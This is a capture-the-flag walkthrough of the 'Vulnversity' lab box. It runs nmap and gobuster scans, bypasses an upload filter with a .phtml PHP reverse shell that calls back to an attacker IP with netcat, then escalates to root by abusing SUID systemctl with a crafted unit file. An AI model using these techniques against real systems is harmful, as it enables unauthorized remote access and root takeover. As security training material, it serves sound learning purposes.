# Vulnversity

## Recon and scanning machine

first thing's first. save that IP
```
export IP=10.10.12.13
```
ping it until it is given us a response

let's run a scan against this machine using NMAP

```
nmap -sV -vv $IP
```
nmap flag	Description
-sV			Attempts to determine the version of the services running

-p or -p-	Port scan for port <x> or scan all ports

-Pn			Disable host discovery and just scan for open ports

-A			Enables OS and version detection, executes in-build scripts for further enumeration 

-sC			Scan with the default nmap scripts
-v			Verbose mode
-sU			UDP port scan
-sS			TCP SYN port scan

Questions

2  Scan the box, how many ports are open?
3 	What version of the squid proxy is running on the machine? 3.5.12
4 	How many ports will nmap scan if the flag -p-400 was used? 400
5 	Using the nmap flag -n what will it not resolve? DNS
6 	What is the most likely operating system this machine is running? Ubuntu
7 	What port is the web server running on? 3333
8 	Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

## Locating directories

Download GoBuster

Run this command

```
 % gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirb/big.txt
 ```
The output should shoow some directories to investigate
```

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.200.189:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/12 18:09:32 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/12 18:10:24 Finished
===============================================================
```

2 	What is the directory that has an upload form page? 
```
/internal
```
## Compromise the server

Now we have the upload form, we can use netcat and a reverse shell to give us access to the server

Now, we have to find out which extensions are blocked and which aren't. We are given a small wordlist to try
```
.php
.php3
.php4
.php5
.phtml
```
First, we need to upload a file to grab the parameters that Burp wants to exploit

if we send a file to the internal upload form, we can grab that parameter and try our mini word list

Of the word list, only .phtml files are not blocked. We can rename our reverse shell to .phtml, use our
local credentials (tun0 and any port we like) and gain access with netcat.

The only part of the reverse shell that needs changing is below..

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.0.71';  // CHANGE THIS TO YOUR VPN IP
$port = 4444;       // CHANGE THIS TO ANY PORT YOU WILL REMEMBER
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

once this is saved as reverse-shell.phtml (or soemthing you will remember)

launch netcat with the port you have chosen

```
nc -lvnp 4444
```
That is now listening on port 4444 and waiting for my reverse shell

Now, we can naviagte to /internal and upload our reverse shell

If we get a success message, we can then go to /internal/uploads/

If you see the reverse shell file, click it and NC will access.

If the reverse shell is not there, it has failed. The server is not stable, so try again until you get in.

## Escalating privilege

1 On the system, search for all SUID files. What file stands out? /bin/systemctl

Now, we are going to use SUID (set own user id) to escalate our privileges and get to root.

On google, these are the most common commands to SUID

```
find "$DIRECTORY" -perm /4000

find "$DIRECTORY" -perm /2000

find "$DIRECTORY" -perm /6000

find "$DIRECTORY" -perm /u=s,g=s
```

*copied from N0wn walkthrough*

First we create a variable which holds a unique file.
```
$ eop=$(mktemp).service
```

This is the unit file that is written into the variable

```	
$ echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $eop
```

now a file called output is created in the tmp folder
```
$ /bin/systemctl link $eop
Created symlink from /etc/systemd/system/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
$ /bin/systemctl enable --now $eop
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
```
run the command to see if it worked...

```	
$ ls -lah /tmp
```
```
total 40K
drwxrwxrwt  8 root     root     4.0K Sep 11 08:02 .
drwxr-xr-x 23 root     root     4.0K Jul 31 18:29 ..
drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .ICE-unix
drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .Test-unix
drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .X11-unix
drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .XIM-unix
drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .font-unix
-rw-r--r--  1 root     root       33 Sep 11 08:02 output
drwx------  3 root     root     4.0K Sep 11 06:43 systemd-private-08e99713731549f5bfffde65043f0c88-systemd-timesyncd.service-5k0yVW
-rw-------  1 www-data www-data    0 Sep 11 07:58 tmp.x1uzp01alO
-rw-rw-rw-  1 www-data www-data  103 Sep 11 07:59 tmp.x1uzp01alO.service
```
There is a file called output and inside that file is the flag.